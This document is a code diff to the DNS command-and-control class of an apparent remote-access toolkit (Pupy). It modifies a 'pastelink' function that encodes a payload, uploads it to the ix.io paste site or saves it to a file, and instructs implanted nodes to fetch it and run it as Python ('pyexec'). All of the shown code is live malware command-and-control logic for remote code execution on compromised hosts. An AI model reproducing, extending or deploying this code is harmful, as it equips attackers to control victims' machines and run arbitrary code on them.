@@ -349,9 +349,11 @@ class PupyDnsCnc(object):
     def proxy(self, *args, **kwargs):
         return self.handler.proxy(*args, **kwargs)
 
-    def pastelink(self, content=None, url=None, action='pyexec', node=None, default=False):
-        if not ( content or url ):
-            raise ValueError('content and url args are empty')
+    def pastelink(self, content=None, output=None, url=None,
+                  action='pyexec', node=None, default=False, legacy=False):
+
+        if not ( content or url):
+            raise ValueError('content and url and output args are empty')
 
         if content and url:
             raise ValueError('both content and url are selected')
@@ -364,19 +366,29 @@ class PupyDnsCnc(object):
             payload = b''
             # TODO: add more providers
             with open(content_path) as content:
-                payload = self.handler.encode_pastelink_content(content.read())
+                payload = self.handler.encode_pastelink_content(
+                    content.read(), self.handler.ENCODER_V1 if legacy else self.handler.ENCODER_V2)
 
-            response = requests.post('http://ix.io', data={'f:1':payload})
-            if response.ok:
-                url = response.content.strip()
+            if not output:
+                response = requests.post('http://ix.io', data={'f:1':payload})
+                if response.ok:
+                    url = response.content.strip()
 
-                if not url:
-                    raise ValueError('couldn\'t create pastelink url')
+                    if not url:
+                        raise ValueError('couldn\'t create pastelink url')
+            else:
+                with open(output, 'wb') as output_file:
+                    output_file.write(payload)
 
-        count = self.handler.pastelink(url, action, node=node, default=default)
-        if count and self.cmdhandler:
-            self.cmdhandler.display_success('Pastelink: Url: {} Action: {}'.format(
-                url, action))
+
+        if self.cmdhandler:
+            self.cmdhandler.display_success('Pastelink: {} Action: {} Legacy: {}'.format(
+                'file: {}'.format(output) if output else 'url: {}'.format(url),
+                action, legacy))
+
+        count = 0
+        if not output:
+            count = self.handler.pastelink(url, action, node=node, default=default)
 
         return count, url
 
